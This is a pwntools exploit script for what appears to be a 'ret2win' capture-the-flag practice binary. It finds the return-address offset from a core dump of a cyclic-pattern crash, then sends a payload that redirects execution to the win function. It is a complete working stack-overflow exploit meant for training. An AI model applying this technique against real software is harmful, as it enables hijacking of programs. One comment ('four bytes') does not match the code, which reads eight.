# This code is better commented out and fully automated
# Can use core dump to find out the rsp values etc
# Interesting function : replacing pattern with the address with fit
#-------------------------------

from pwn import *

elf = context.binary = ELF("ret2win")

# Enable verbose logging

context.log_level = 'debug'

# Print out the target address
info("%#x target", elf.symbols.ret2win)

# Figure out how big of an overflow we need
# by crashing the process once

io = process(elf.path)

# Sending a cyclic pattern whcih overwrites the return address
# on the stack. The value 128 is longer than the buffer.

io.sendline(cyclic(128))

# Wait for the process to crash
io.wait()
# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing
stack = core.rsp
info("%#x stack", stack)
# Read four bytes from rsp, which will be some of our cyclic data
# The beginning of our controlled data to the ret address.
pattern = core.read(stack, 8)
info("%r pattern", pattern)
payload = fit({
    pattern: elf.symbols.ret2win
    })
# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
io.recvuntil("Here's your flag:")
# Get the flag

io.interactive()
